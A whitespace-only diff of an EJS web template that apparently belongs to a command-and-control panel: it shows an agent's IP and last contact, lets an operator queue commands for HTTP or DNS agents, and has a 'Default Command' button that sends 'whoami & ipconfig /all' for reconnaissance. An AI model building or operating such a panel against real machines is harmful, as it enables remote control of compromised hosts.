@@ -15,7 +15,7 @@
 				now_time.setSeconds(now_time.getSeconds() + 1);
 
 				document.getElementById("time_now").innerHTML = now_time.toString();
-				
+
 				var days = Math.floor(distance / (1000 * 60 * 60 * 24));
 				var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
 				var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
@@ -28,7 +28,7 @@
 		var auto_refresh = setInterval(
 			function (){
 				location.reload();
-			}, 120000); 
+			}, 120000);
 
 		function sendDefaultCommand() {
 
@@ -45,7 +45,7 @@
 			if(f_agentType == "dns") {
 
 				var f_commandType = document.getElementById("f_commandType").value;
-				
+
 				var hf1 = document.createElement("input");
 				hf1.setAttribute("type", "hidden");
 				hf1.setAttribute("name", "commandId");
@@ -57,7 +57,7 @@
 				hf2.setAttribute("name", "command");
 				hf2.setAttribute("value", "whoami & ipconfig /all");
 				form.appendChild(hf2);
-				
+
 				var hf3 = document.createElement("input");
 				hf3.setAttribute("type", "hidden");
 				hf3.setAttribute("name", "agentId");
@@ -69,7 +69,7 @@
 				hf4.setAttribute("name", "agentType");
 				hf4.setAttribute("value", f_agentType);
 				form.appendChild(hf4);
-				
+
 				/*var hf5 = document.createElement("input");
 				hf5.setAttribute("type", "hidden");
 				hf5.setAttribute("name", "commandType");
@@ -81,7 +81,7 @@
 				hf6.setAttribute("name", "defaultCommand");
 				hf6.setAttribute("value", "yes");
 				form.appendChild(hf6);
-				
+
 			} else {
 				var hf1 = document.createElement("input");
 				hf1.setAttribute("type", "hidden");
@@ -94,7 +94,7 @@
 				hf2.setAttribute("name", "command");
 				hf2.setAttribute("value", "whoami&ipconfig /all");
 				form.appendChild(hf2);
-				
+
 				var hf3 = document.createElement("input");
 				hf3.setAttribute("type", "hidden");
 				hf3.setAttribute("name", "agentId");
@@ -106,7 +106,7 @@
 				hf4.setAttribute("name", "agentType");
 				hf4.setAttribute("value", f_agentType);
 				form.appendChild(hf4);
-				
+
 				/*var hf5 = document.createElement("input");
 				hf5.setAttribute("type", "hidden");
 				hf5.setAttribute("name", "commandType");
@@ -119,7 +119,7 @@
 				hf6.setAttribute("value", "yes");
 				form.appendChild(hf6);
 			}
-			
+
 			document.body.appendChild(form);
 			form.submit();
 		}
@@ -145,7 +145,7 @@
 			</div>
 		</div>
 		<!-- End Logo + Top Nav -->
-		
+
 		<!-- Main Nav -->
 		<div id="navigation">
 			<ul>
@@ -161,12 +161,12 @@
 <!-- Container -->
 <div  id="container" >
 	<div class="shell">
-		
+
 		<br />
 		<!-- Main -->
 		<div id="main">
 			<div class="cl">&nbsp;</div>
-			
+
 			<!-- Content -->
 			<div id="content">
 								<div class="box">
@@ -175,9 +175,9 @@
 						<h2>Agent Details</h2>
 					</div>
 					<!-- End Box Head -->
-					
+
 					<form action="/" enctype="multipart/form-data" method="POST">
-						
+
 						<!-- Form -->
 						<div>
 						<center>	<table  id="showdetil">
@@ -187,13 +187,13 @@
 								</ul>
 									</td><td>
 									<ul style="list-style-type: none;">
-											<li><h2>IP: <%= agentDetails[2] %></h2></li>		
+											<li><h2>IP: <%= agentDetails[2] %></h2></li>
 								<li><h2><p id="time_now" hidden><%= current_time.toString() %></p><p id="visitTime" hidden><%= agentDetails[3].toString() %></p>LastTime: <%= agentDetails[3] %></h2></li>
 							</ul>
 							</td></tr>
 							</table>	</center>
 						</div>
-		
+
 
 						<!-- End Form -->
 
@@ -201,7 +201,7 @@
 
 						<!-- End Form Buttons -->
 					</form>
-				</div>	
+				</div>
 				<!-- Box -->
 				<div class="box">
 					<!-- Box Head -->
@@ -209,9 +209,9 @@
 						<h2>Add New Command</h2>
 					</div>
 					<!-- End Box Head -->
-					
+
 					<form action="/" enctype="multipart/form-data" method="POST">
-						
+
 						<!-- Form -->
 						<div class="form">
 							<input id="f_agentId" name="agentId" 	type="hidden"	value="<%= agentDetails[0] %>" />
@@ -235,12 +235,12 @@
 						</div>
 
 						<!-- End Form -->
-						
+
 						<!-- Form Buttons -->
 						<div id="form_buttons" class="buttons">
 							<input id="submit_button" type="submit" class="button"  value="RUN" />
 							<% if(agentDetails[4]=="dns") {  %><div id="commandTypeDiv"><input id="f_commandType" type="checkbox" name="commandType">Text Request</input>  </div> <% } %>
-							
+
 						</div>
 						<!-- End Form Buttons -->
 					</form>
@@ -258,7 +258,7 @@
 							<input id="default_button" onclick="sendDefaultCommand()" type="submit" class="button" value="Default Command"/>
 						</div>
 					</div>
-					<!-- End Box Head -->	
+					<!-- End Box Head -->
 
 					<!-- Table -->
 					<!--<div class="table" id="command_table">-->
@@ -281,15 +281,15 @@
 									<td onClick="javascript:window.location.href='/res/<%= agentDetails[4] %>-<%= agentDetails[0] %>-<%= commands[i][0] %>'"><% if(commands[i][(commands[i].length-1)]=="0") {%>In Queue<%} else if(commands[i][(commands[i].length-1)]=="01") {%>Sending<%} else if(commands[i][(commands[i].length-1)]=="1") {%>Sended<%} else if(commands[i][(commands[i].length-1)]=="12") {%>Receiving<%} else {%>Received<%}%></td>
 									<td onClick="javascript:window.location.href='/delcmd/<%= agentDetails[4] %>-<%= agentDetails[0] %>-<%= commands[i][0] %>'"><a class="ico del">Delete</a></td>
 								</tr>
-							
-							<% } %>
-							
-							
 
-							
+							<% } %>
+
+
+
+
 						</table>
-						
-						
+
+
 						<script>
 function sortTable(n) {
   var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
@@ -305,7 +305,7 @@ function sortTable(n) {
     rows = table.rows;
     /* Loop through all table rows (except the
     first, which contains table headers): */
-	
+
     for (i = 1; i < (rows.length - 1); i++) {
       // Start by saying there should be no switching:
       shouldSwitch = false;
@@ -354,7 +354,7 @@ function sortTable(n) {
 				</div>
 				<!-- End Box -->
 			</div>
-			<div class="cl">&nbsp;</div>			
+			<div class="cl">&nbsp;</div>
 		</div>
 		<!-- Main -->
 	</div>
@@ -388,7 +388,7 @@ function sortTable2(n) {
     rows = table.rows;
     /* Loop through all table rows (except the
     first, which contains table headers): */
-	
+
     for (i = 1; i < (rows.length - 1); i++) {
       // Start by saying there should be no switching:
       shouldSwitch = false;
@@ -429,7 +429,7 @@ function sortTable2(n) {
       }
     }
   }
-  
+
 }
 document.getElementById("demo").innerHTML = sortTable2(1);
 
